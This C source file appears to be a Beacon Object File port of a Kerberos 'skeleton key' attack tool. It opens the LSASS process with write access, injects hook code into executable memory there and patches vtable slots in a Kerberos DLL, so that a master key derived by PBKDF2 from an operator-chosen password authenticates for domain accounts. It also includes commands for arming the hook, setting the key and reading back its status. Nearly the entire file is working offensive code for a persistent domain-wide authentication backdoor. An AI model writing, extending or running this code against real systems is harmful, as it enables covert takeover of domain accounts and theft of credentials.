/*
 * kuhl_m_skeleton_aes.c — AES all-users skeleton key, BOF port.
 *
 * 1:1 port of the verified standalone toolchain:
 *   - hooks:  standalone/hook_aes_derive.c + hook_aes_decrypt2.c (PIC blobs,
 *             embedded here as aes_derive_blob.h / aes_decrypt2_blob.h)
 *   - install: standalone/skelinstall_derive.cpp
 *   - control: standalone/skelread_derive.cpp (status/mode/loadtable/addraw/setmaster)
 *
 * The only safe mutation is substituting the DeriveSpecificKey INPUT pointer
 * for byte-matched, table-armed accounts (adaptive: real passwords preserved).
 * No writes to LSASS-owned key material anywhere.
 *
 * Vtable slots / fn RVAs are BUILD-SPECIFIC (Kerb3961.dll 26100.33158):
 *   slot 0x1d6b8 (Aes3962/AES128 derive) -> 0x18e70 (base impl)   slotId 1
 *   slot 0x1d4b0 (Aes8009/AES256 derive) -> 0x16b30 (override)    slotId 2
 *   slot 0x1d6e0 (AES128 Decrypt)         -> 0x18500
 */
#include "kuhl_m_skeleton_aes.h"
#include "derive_ctx.h"
#include "aes_derive_blob.h"
#include "aes_decrypt2_blob.h"
#include "skel_discover.h"

void bof_output_flush(void);
#define SKELDBG(...) kprintf(__VA_ARGS__)

#define KERB3961_AES128_DERIVE_SLOT_RVA 0x1d6b8   /* -> 0x18e70 */
#define KERB3961_AES256_DERIVE_SLOT_RVA 0x1d4b0   /* -> 0x16b30 */
#define KERB3961_AES128_DECRYPT_SLOT_RVA 0x1d6e0  /* -> 0x18500 */
#define KERB3961_AES128_DERIVE_FN_RVA   0x18e70
#define KERB3961_AES256_DERIVE_FN_RVA   0x16b30
#define KERB3961_AES128_DECRYPT_FN_RVA  0x18500

#define SKEL_KERB3961_IMAGE_MAX 0x2c000   /* slot sanity: in-image vs hook */

/* placeholders (must match the blob markers baked by gen_derive_blob.py) */
#define PH_DERIVE_ORIG  0x3131313131313131ULL
#define PH_HOOK_CTX     0x3232323232323232ULL
#define PH_DERIVE_SLOT  0x3333333333333333ULL
#define PH_DECRYPT_ORIG 0x4444444444444444ULL

/* ---- process/memory helpers (kull_m_* wrappers) ---- */

static BOOL skel_open_lsass(PKULL_M_MEMORY_HANDLE *pH, HANDLE *phProcess)
{
    DWORD pid;
    HANDLE h;
    if(!kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
    {
        SKELDBG(L"[skeletonTicket] lsass.exe not found\n");
        return FALSE;
    }
    h = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                    PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION, FALSE, pid);
    if(!h)
    {
        SKELDBG(L"[skeletonTicket] OpenProcess(lsass) failed\n");
        return FALSE;
    }
    if(!kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, h, pH))
    {
        SKELDBG(L"[skeletonTicket] kull_m_memory_open failed\n");
        CloseHandle(h);
        return FALSE;
    }
    if(phProcess) *phProcess = h;
    return TRUE;
}

static BOOL skel_rpm(PKULL_M_MEMORY_HANDLE h, PVOID remote, PVOID local, SIZE_T n)
{
    KULL_M_MEMORY_ADDRESS r = {remote, h};
    KULL_M_MEMORY_ADDRESS l = {local, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    return kull_m_memory_copy(&l, &r, n);
}

static BOOL skel_wpm(PKULL_M_MEMORY_HANDLE h, PVOID remote, const PVOID local, SIZE_T n)
{
    KULL_M_MEMORY_ADDRESS r = {remote, h};
    KULL_M_MEMORY_ADDRESS l = {(PVOID) local, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    return kull_m_memory_copy(&r, &l, n);
}

static BOOL skel_alloc(PKULL_M_MEMORY_HANDLE h, SIZE_T size, DWORD protect, PVOID *out)
{
    KULL_M_MEMORY_ADDRESS a = {NULL, h};
    if(!kull_m_memory_alloc(&a, size, protect))
        return FALSE;
    *out = a.address;
    return TRUE;
}

/* patch one vtable slot: verify current value, then swap to hook */
static BOOL skel_patch_slot(PKULL_M_MEMORY_HANDLE h, DWORD64 base, DWORD slotRva,
                            DWORD fnRva, PVOID hook, const wchar_t *label)
{
    PVOID slot = (PVOID)(ULONG_PTR)(base + slotRva);
    DWORD64 cur = 0, expect = base + (DWORD64) fnRva, hookVal = (DWORD64)(ULONG_PTR) hook;
    DWORD old = 0;
    KULL_M_MEMORY_ADDRESS aRemote = {slot, h};

    if(!skel_rpm(h, slot, &cur, 8))
    {
        SKELDBG(L"[skeletonTicket] %s slot read failed\n", label);
        return FALSE;
    }
    if(cur != expect && cur >= base && cur < base + SKEL_KERB3961_IMAGE_MAX)
    {
        SKELDBG(L"[skeletonTicket] %s slot holds in-image 0x%llx (expected 0x%llx) — abort\n",
                label, (unsigned long long) cur, (unsigned long long) expect);
        return FALSE;
    }
    if(cur != expect)
        SKELDBG(L"[skeletonTicket] %s slot already patched (0x%llx) — re-patching\n",
                label, (unsigned long long) cur);

    if(!kull_m_memory_protect(&aRemote, 8, PAGE_READWRITE, &old))
    {
        SKELDBG(L"[skeletonTicket] %s slot protect failed\n", label);
        return FALSE;
    }
    if(!skel_wpm(h, slot, &hookVal, 8))
    {
        SKELDBG(L"[skeletonTicket] %s slot write failed\n", label);
        kull_m_memory_protect(&aRemote, 8, old, NULL);
        return FALSE;
    }
    kull_m_memory_protect(&aRemote, 8, old, NULL);
    return TRUE;
}

/* copy a blob to a fresh RWX page in LSASS, patching its placeholders */
static BOOL skel_inject_blob(PKULL_M_MEMORY_HANDLE h, DWORD64 base, PVOID ctxAddr,
                             DWORD fnRva, DWORD slotId,
                             const unsigned char *blob, size_t blobLen,
                             const struct aes_derive_ph *phTab, size_t phTotal,
                             const wchar_t *label, PVOID *out)
{
    PBYTE buf;
    PVOID remote;
    size_t i;

    if(!skel_alloc(h, 0x10000, PAGE_EXECUTE_READWRITE, &remote))
    {
        SKELDBG(L"[skeletonTicket] %s blob alloc failed\n", label);
        return FALSE;
    }
    buf = (PBYTE) LocalAlloc(LPTR, (SIZE_T) blobLen);
    if(!buf) return FALSE;
    memcpy(buf, blob, blobLen);

    for(i = 0; i < phTotal; i++)
    {
        DWORD64 val = 0;
        switch(phTab[i].marker)
        {
            case PH_DERIVE_ORIG:
            case PH_DECRYPT_ORIG: val = base + (DWORD64) fnRva; break;
            case PH_HOOK_CTX:     val = (DWORD64)(ULONG_PTR) ctxAddr; break;
            case PH_DERIVE_SLOT:  val = (DWORD64) slotId; break;
            default:              break;
        }
        memcpy(buf + phTab[i].offset, &val, 8);
    }

    if(!skel_wpm(h, remote, buf, blobLen))
    {
        SKELDBG(L"[skeletonTicket] %s blob write failed\n", label);
        LocalFree(buf);
        return FALSE;
    }
    LocalFree(buf);
    *out = remote;
    return TRUE;
}

/* ---- install ---- */

static PBYTE skel_read_image(PKULL_M_MEMORY_HANDLE h, DWORD64 base, DWORD size)
{
    PBYTE buf = (PBYTE)LocalAlloc(LPTR, size);
    if(!buf) return NULL;
    if(!skel_rpm(h, (PVOID)(ULONG_PTR)base, buf, size)) { LocalFree(buf); return NULL; }
    return buf;
}

NTSTATUS kuhl_m_skeleton_aes_install(PVOID *pCtxAddr)
{
    PKULL_M_MEMORY_HANDLE hLsass = NULL;
    HANDLE hProcess = NULL;
    KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION kerb;
    DWORD64 base, chkA, chkB;
    long fnA = -1, slotA = -1, fnB = -1, slotB = -1, fnD = -1, slotD = -1;
    PBYTE imgBuf = NULL;
    SKD_CTX ctx;
    PVOID ctxAddr = NULL, blobA = NULL, blobB = NULL, blobD = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    *pCtxAddr = NULL;

    if(!skel_open_lsass(&hLsass, &hProcess))
        return STATUS_NOT_FOUND;

    if(!kull_m_process_getVeryBasicModuleInformationsForName(hLsass, L"Kerb3961.dll", &kerb))
    {
        SKELDBG(L"[skeletonTicket] Kerb3961.dll not found\n");
        status = STATUS_NOT_FOUND; goto done;
    }
    base = (DWORD64) kerb.DllBase.address;

    /* dynamic discovery: read the image + resolve fn/slot from anchors */
    imgBuf = skel_read_image(hLsass, base, kerb.SizeOfImage);
    if(!imgBuf)
    {
        SKELDBG(L"[skeletonTicket] Kerb3961.dll image read failed\n");
        status = STATUS_REVISION_MISMATCH; goto done;
    }
    if(skel_disc_discover(imgBuf, kerb.SizeOfImage, base,
                          "specificKey->Kc = RandomToKey(derivedKey)", &fnA, &slotA) != 0 ||
       skel_disc_discover(imgBuf, kerb.SizeOfImage, base,
                          "specificKey->Kc = DeriveKey(protocolKey, {5, constant.data}, {}, m_micLength)", &fnB, &slotB) != 0 ||
       skel_disc_discover(imgBuf, kerb.SizeOfImage, base,
                          "SecureEqualBuffer(hmac, checksum)", &fnD, &slotD) != 0)
    {
        SKELDBG(L"[skeletonTicket] dynamic discovery failed — build mismatch, abort\n");
        status = STATUS_REVISION_MISMATCH; goto done;
    }
    LocalFree(imgBuf); imgBuf = NULL;

    /* sanity: slots hold the original fn pointers (or an existing hook) */
    skel_rpm(hLsass, (PVOID)(ULONG_PTR)(base + (DWORD64)slotA), &chkA, 8);
    skel_rpm(hLsass, (PVOID)(ULONG_PTR)(base + (DWORD64)slotB), &chkB, 8);
    if((chkA != base + (DWORD64)fnA && chkA >= base && chkA < base + SKEL_KERB3961_IMAGE_MAX) ||
       (chkB != base + (DWORD64)fnB && chkB >= base && chkB < base + SKEL_KERB3961_IMAGE_MAX))
    {
        SKELDBG(L"[skeletonTicket] slot sanity failed (unknown in-image value) — abort\n");
        status = STATUS_REVISION_MISMATCH; goto done;
    }

    /* CTX page (RW, shared state for hooks + driver) */
    if(!skel_alloc(hLsass, SKD_CTX_SZ, PAGE_READWRITE, &ctxAddr))
    {
        SKELDBG(L"[skeletonTicket] CTX alloc failed\n");
        goto done;
    }
    memset(&ctx, 0, sizeof(ctx));
    ctx.magic = SKD_MAGIC;
    ctx.ver   = SKD_VER;
    ctx.mode  = 0;   /* DIAG — operator arms via `mode 2` */
    ctx.subBuf = (uint64_t)(ULONG_PTR) ctxAddr + offsetof(SKD_CTX, masterKey);
    if(!skel_wpm(hLsass, ctxAddr, &ctx, sizeof(ctx)))
    {
        SKELDBG(L"[skeletonTicket] CTX write failed\n");
        goto done;
    }

    /* blob A: AES128 derive (slotId 1) */
    if(!skel_inject_blob(hLsass, base, ctxAddr, (DWORD)fnA, 1,
                         aes_derive, aes_derive_len, aes_derive_placeholders,
                         aes_derive_ph_total, L"blobA AES128-derive", &blobA)) goto done;
    /* blob B: AES256 derive (slotId 2) */
    if(!skel_inject_blob(hLsass, base, ctxAddr, (DWORD)fnB, 2,
                         aes_derive, aes_derive_len, aes_derive_placeholders,
                         aes_derive_ph_total, L"blobB AES256-derive", &blobB)) goto done;
    /* blob D: AES128 decrypt (capture-only) */
    if(!skel_inject_blob(hLsass, base, ctxAddr, (DWORD)fnD, 3,
                         aes_decrypt2, aes_decrypt2_len,
                         (const struct aes_derive_ph *) aes_decrypt2_placeholders,
                         aes_decrypt2_ph_total, L"blobD AES128-decrypt", &blobD)) goto done;

    /* record blob addrs in CTX, then patch the three slots */
    skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, slotA)), &blobA, 8);
    skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, slotB)), &blobB, 8);

    if(!skel_patch_slot(hLsass, base, (DWORD)slotA, (DWORD)fnA,
                        (PVOID)((ULONG_PTR) blobA + aes_derive_entry_off), L"blobA AES128-derive")) goto done;
    if(!skel_patch_slot(hLsass, base, (DWORD)slotB, (DWORD)fnB,
                        (PVOID)((ULONG_PTR) blobB + aes_derive_entry_off), L"blobB AES256-derive")) goto done;
    if(!skel_patch_slot(hLsass, base, (DWORD)slotD, (DWORD)fnD,
                        (PVOID)((ULONG_PTR) blobD + aes_decrypt2_entry_off), L"blobD AES128-decrypt")) goto done;

    *pCtxAddr = ctxAddr;
    status = STATUS_SUCCESS;

done:
    if(hProcess) CloseHandle(hProcess);
    return status;
}

/* ---- control ---- */

static int skel_hex_nib(char c)
{
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int skel_parse_hex(const char *s, BYTE *out, DWORD max)
{
    size_t len = (s) ? strlen(s) : 0;
    size_t i;
    if(len == 0 || (len & 1) || len / 2 > max) return -1;
    for(i = 0; i < len; i += 2)
    {
        int hi = skel_hex_nib(s[i]), lo = skel_hex_nib(s[i + 1]);
        if(hi < 0 || lo < 0) return -1;
        out[i / 2] = (BYTE)((hi << 4) | lo);
    }
    return (int)(len / 2);
}

/* read the CTX back from LSASS */
static BOOL skel_read_ctx(PKULL_M_MEMORY_HANDLE h, PVOID ctxAddr, SKD_CTX *c)
{
    if(!skel_rpm(h, ctxAddr, c, sizeof(*c)))
        return FALSE;
    return c->magic == SKD_MAGIC;
}

NTSTATUS kuhl_m_skeleton_aes_status(PVOID ctxAddr)
{
    PKULL_M_MEMORY_HANDLE hLsass = NULL;
    HANDLE hProcess = NULL;
    SKD_CTX c;
    unsigned i;

    if(!ctxAddr) { SKELDBG(L"[skeletonTicket] no CTX address\n"); return STATUS_INVALID_PARAMETER; }
    if(!skel_open_lsass(&hLsass, &hProcess)) return STATUS_NOT_FOUND;
    if(!skel_read_ctx(hLsass, ctxAddr, &c))
    {
        SKELDBG(L"[skeletonTicket] CTX @ 0x%p read failed / bad magic\n", ctxAddr);
        CloseHandle(hProcess);
        return STATUS_NOT_FOUND;
    }

    SKELDBG(L"[skeletonTicket] CTX @ 0x%p magic=%08x ver=%u mode=%d fires=%llu substHits=%llu recIdx=%llu\n",
            ctxAddr, c.magic, c.ver, c.mode,
            (unsigned long long) c.fires, (unsigned long long) c.substHits,
            (unsigned long long) c.recIdx);
    SKELDBG(L"[skeletonTicket]   slotA=0x%llx slotB=0x%llx\n",
            (unsigned long long) c.slotA, (unsigned long long) c.slotB);
    SKELDBG(L"[skeletonTicket]   masterLen=%u pendKlen=%u pendMlen=%u pendSeq=%llu\n",
            c.masterLen, c.pendKlen, c.pendMlen, (unsigned long long) c.pendSeq);
    /* last few ring records */
    for(i = 0; i < SKD_REC_N; i++)
    {
        const SKD_REC *r = &c.rec[i];
        if(r->seq == 0 && r->keyPtr == 0) continue;
        SKELDBG(L"[skeletonTicket]   rec[%u] slot=%u usage=%u status=%08x subst=%u len=%u\n",
                i, r->slotId, r->usage, r->status, r->substituted, r->lenObserved);
    }

    CloseHandle(hProcess);
    return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_skeleton_aes_mode(PVOID ctxAddr, int mode)
{
    PKULL_M_MEMORY_HANDLE hLsass = NULL;
    HANDLE hProcess = NULL;
    int m = mode;
    if(!ctxAddr) return STATUS_INVALID_PARAMETER;
    if(!skel_open_lsass(&hLsass, &hProcess)) return STATUS_NOT_FOUND;
    if(!skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, mode)), &m, sizeof(m)))
    {
        SKELDBG(L"[skeletonTicket] mode write failed\n");
        CloseHandle(hProcess);
        return STATUS_UNSUCCESSFUL;
    }
    SKELDBG(L"[skeletonTicket] mode -> %d (%s)\n", m, m == 2 ? L"CONDITIONAL" : (m == 0 ? L"DIAG" : L"?"));
    CloseHandle(hProcess);
    return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_skeleton_aes_setmaster(PVOID ctxAddr, LPCSTR masterHex)
{
    PKULL_M_MEMORY_HANDLE hLsass = NULL;
    HANDLE hProcess = NULL;
    BYTE key[32];
    int n;
    if(!ctxAddr || !masterHex) return STATUS_INVALID_PARAMETER;
    n = skel_parse_hex(masterHex, key, 32);
    if(n != 16 && n != 32) return STATUS_INVALID_PARAMETER;
    if(!skel_open_lsass(&hLsass, &hProcess)) return STATUS_NOT_FOUND;
    if(!skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, masterKey)), key, (SIZE_T) n) ||
       !skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, masterLen)), &n, 4) ||
       !skel_wpm(hLsass, (PVOID)((ULONG_PTR) ctxAddr + offsetof(SKD_CTX, subLen)), &n, 4))
    {
        SKELDBG(L"[skeletonTicket] setmaster write failed\n");
        CloseHandle(hProcess);
        return STATUS_UNSUCCESSFUL;
    }
    SKELDBG(L"[skeletonTicket] setmaster <- %d bytes\n", n);
    CloseHandle(hProcess);
    return STATUS_SUCCESS;
}


/* ===================== v8: one-shot fixed-key arm =====================
 * masterKey = PBKDF2-HMAC-SHA1(password, UPPER(realm), 4096, dkLen=32).
 * The AES-128 (etype 17) master key is the first 16 bytes (PBKDF2 blocks are
 * sequential, so the 16-byte output == first 16 bytes of the 32-byte output).
 * This MATCHES skel_gettgt.py's hashlib.pbkdf2_hmac('sha1', ...). */

typedef struct { DWORD h[5]; BYTE blk[64]; DWORD blen; ULONGLONG bitlen; } SK_SHA1;

static DWORD sk_rol32(DWORD v, int n) { return (v << n) | (v >> (32 - n)); }

static void sk_sha1_tf(DWORD h[5], const BYTE *b)
{
    DWORD w[80], a, bb, c, d, e, f, k, t; int i;
    for (i = 0; i < 16; i++)
        w[i] = ((DWORD)b[i*4]<<24)|((DWORD)b[i*4+1]<<16)|((DWORD)b[i*4+2]<<8)|(DWORD)b[i*4+3];
    for (i = 16; i < 80; i++) w[i] = sk_rol32(w[i-3]^w[i-8]^w[i-14]^w[i-16], 1);
    a = h[0]; bb = h[1]; c = h[2]; d = h[3]; e = h[4];
    for (i = 0; i < 80; i++) {
        if (i < 20)      { f = (bb & c) | ((~bb) & d);        k = 0x5A827999; }
        else if (i < 40) { f = bb ^ c ^ d;                    k = 0x6ED9EBA1; }
        else if (i < 60) { f = (bb & c) | (bb & d) | (c & d); k = 0x8F1BBCDC; }
        else             { f = bb ^ c ^ d;                    k = 0xCA62C1D6; }
        t = sk_rol32(a, 5) + f + e + k + w[i];
        e = d; d = c; c = sk_rol32(bb, 30); bb = a; a = t;
    }
    h[0] += a; h[1] += bb; h[2] += c; h[3] += d; h[4] += e;
}

static void sk_sha1_ini(SK_SHA1 *s)
{
    s->h[0]=0x67452301; s->h[1]=0xEFCDAB89; s->h[2]=0x98BADCFE;
    s->h[3]=0x10325476; s->h[4]=0xC3D2E1F0; s->blen=0; s->bitlen=0;
}

static void sk_sha1_upd(SK_SHA1 *s, const BYTE *d, DWORD n)
{
    DWORD i;
    for (i = 0; i < n; i++) {
        s->blk[s->blen++] = d[i]; s->bitlen += 8;
        if (s->blen == 64) { sk_sha1_tf(s->h, s->blk); s->blen = 0; }
    }
}

static void sk_sha1_fin(SK_SHA1 *s, BYTE out[20])
{
    ULONGLONG bits = s->bitlen; BYTE lenb[8]; BYTE one = 0x80; BYTE z = 0;
    DWORD pad, i;
    sk_sha1_upd(s, &one, 1);
    pad = (s->blen <= 56) ? (56 - s->blen) : (120 - s->blen);
    for (i = 0; i < pad; i++) sk_sha1_upd(s, &z, 1);
    for (i = 0; i < 8; i++) lenb[i] = (BYTE)(bits >> (56 - i*8));
    sk_sha1_upd(s, lenb, 8);
    for (i = 0; i < 5; i++) {
        out[i*4+0] = (BYTE)(s->h[i] >> 24);
        out[i*4+1] = (BYTE)(s->h[i] >> 16);
        out[i*4+2] = (BYTE)(s->h[i] >> 8);
        out[i*4+3] = (BYTE)(s->h[i]);
    }
}

static void sk_hmac_sha1(const BYTE *key, DWORD klen, const BYTE *d, DWORD dlen, BYTE out[20])
{
    BYTE ipad[64], opad[64], ih[20]; SK_SHA1 in, ot; DWORD i;
    for (i = 0; i < 64; i++) {
        BYTE k = (i < klen) ? key[i] : 0;
        ipad[i] = k ^ 0x36; opad[i] = k ^ 0x5c;
    }
    sk_sha1_ini(&in); sk_sha1_upd(&in, ipad, 64); sk_sha1_upd(&in, d, dlen); sk_sha1_fin(&in, ih);
    sk_sha1_ini(&ot); sk_sha1_upd(&ot, opad, 64); sk_sha1_upd(&ot, ih, 20); sk_sha1_fin(&ot, out);
}

static void sk_pbkdf2(const BYTE *pass, DWORD plen, const BYTE *salt, DWORD slen, DWORD iters, BYTE *dk, DWORD dklen)
{
    BYTE blk[4 + 128], u[20], t[20]; DWORD b, j, i;
    for (b = 1; dklen > 0; b++, dklen -= (dklen > 20 ? 20 : dklen)) {
        DWORD take = (dklen > 20) ? 20 : dklen;
        for (i = 0; i < slen && i < 128; i++) blk[i] = salt[i];
        blk[slen+0] = (BYTE)(b >> 24); blk[slen+1] = (BYTE)(b >> 16);
        blk[slen+2] = (BYTE)(b >> 8);  blk[slen+3] = (BYTE)b;
        sk_hmac_sha1(pass, plen, blk, slen + 4, u);
        for (i = 0; i < 20; i++) t[i] = u[i];
        for (j = 1; j < iters; j++) {
            sk_hmac_sha1(pass, plen, u, 20, u);
            for (i = 0; i < 20; i++) t[i] ^= u[i];
        }
        for (i = 0; i < take; i++) dk[(b-1)*20 + i] = t[i];
    }
}

NTSTATUS kuhl_m_skeleton_aes_install_pw(LPCSTR password, PVOID *pCtxAddr)
{
    BYTE mk[32];
    BYTE salt[128];
    wchar_t domain[128];
    DWORD dlen = ARRAYSIZE(domain);
    DWORD slen = 0, i;
    NTSTATUS st;

    *pCtxAddr = NULL;

    /* salt = UPPER(DNS realm), no account name (fixed key). */
    if (GetComputerNameExW(ComputerNameDnsDomain, domain, &dlen) && domain[0]) {
        for (i = 0; domain[i] && slen < 127; i++) {
            wchar_t c = domain[i];
            if (c >= L'a' && c <= L'z') c = c - L'a' + L'A';
            if (c < 0x80) salt[slen++] = (BYTE)c;
        }
    }
    if (slen == 0) {
        /* fallback: assume single-label realm */
        for (i = 0; i < 14; i++) salt[slen++] = (BYTE)"HALCYON.LOCAL"[i];
        salt[14] = 0;
    }

    sk_pbkdf2((const BYTE *)password, (DWORD)strlen(password), salt, slen, 4096, mk, 32);

    st = kuhl_m_skeleton_aes_install(pCtxAddr);
    if (!NT_SUCCESS(st) || !*pCtxAddr)
        return st;

    /* write the universal master key + arm (mode 2) */
    {
        PKULL_M_MEMORY_HANDLE hLsass = NULL;
        HANDLE hProcess = NULL;
        DWORD mlen = 32;
        int32_t mode = 2;
        if (!skel_open_lsass(&hLsass, &hProcess))
            return STATUS_NOT_FOUND;
        skel_wpm(hLsass, (PVOID)((ULONG_PTR)*pCtxAddr + offsetof(SKD_CTX, masterKey)), mk, 32);
        skel_wpm(hLsass, (PVOID)((ULONG_PTR)*pCtxAddr + offsetof(SKD_CTX, masterLen)), &mlen, 4);
        skel_wpm(hLsass, (PVOID)((ULONG_PTR)*pCtxAddr + offsetof(SKD_CTX, mode)), &mode, 4);
        CloseHandle(hProcess);

        SKELDBG(L"[skeletonTicket] master key (PBKDF2, salt=%hs):", (const char *)salt);
        for (i = 0; i < 32; i++) SKELDBG(L"%02x", mk[i]);
        SKELDBG(L"\n[skeletonTicket] ARMED (mode 2). CTX @ 0x%p\n", *pCtxAddr);
    }
    return STATUS_SUCCESS;
}
